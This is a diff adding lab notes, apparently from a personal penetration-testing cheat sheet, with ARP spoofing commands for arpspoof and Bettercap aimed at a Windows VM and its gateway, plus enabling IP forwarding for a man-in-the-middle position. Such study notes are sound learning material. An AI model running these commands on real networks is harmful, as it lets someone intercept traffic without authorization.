@@ -114,3 +114,32 @@ netdiscover -c 10 -r 10.0.2.1/24 -i eth0 #increases no. of packets
 * zenmap (GUI for nmap) can be used to gather more data about devices within subnet range.
 
 ---
+
+* ARP Spoofing using arpspoof:
+
+```shell
+arp -a #to view arp table, works on both Linux and Windows
+
+arpspoof -i eth0 -t 10.0.2.15 10.0.2.1 #arpspoof target victim (Windows VM) through gateway
+
+arpspoof -i eth0 -t 10.0.2.1 10.0.2.15 #arpspoof target router (gateway) through victim
+#both arpspoof commands required to be run simultaneously
+#result can be observed by viewing changed MAC address using 'arp -a' on victim PC
+
+echo 1 > /proc/sys/net/ipv4/ip_forward #enable port forwarding
+```
+
+* ARP Spoofing using Bettercap:
+
+```shell
+bettercap -iface eth0 #initialize
+
+net.probe on #net probing, gives list of connected IPs
+
+net.show #list of connected clients
+
+set arp.spoof.fullduplex true
+set arp.spoof.targets 10.0.2.15 #change parameter values
+
+arp.spoof on #start arp spoofer
+```
